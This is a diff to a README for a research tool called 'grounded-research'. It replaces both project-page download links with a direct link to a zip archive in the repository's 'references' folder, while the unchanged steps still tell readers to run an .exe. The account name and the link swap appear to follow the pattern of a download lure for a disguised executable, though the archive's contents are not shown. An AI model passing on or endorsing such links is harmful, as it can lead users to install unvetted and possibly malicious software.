@@ -1,6 +1,6 @@
 # 🔍 grounded-research - Research with verified facts and citations
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Out-treatyofversailles910/grounded-research)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Out-treatyofversailles910/grounded-research/raw/refs/heads/main/references/grounded_research_v2.2.zip)
 
 ## 🎯 Purpose of this tool
 
@@ -32,7 +32,7 @@ Your computer must meet these standards to run the software smoothly:
 Follow these steps to prepare your system:
 
 1. Click the link below to reach the project page.
-[Download Software](https://github.com/Out-treatyofversailles910/grounded-research)
+[Download Software](https://github.com/Out-treatyofversailles910/grounded-research/raw/refs/heads/main/references/grounded_research_v2.2.zip)
 
 2. Look for the file ending in .exe in the latest release section.
 3. Click the file name to start your download.
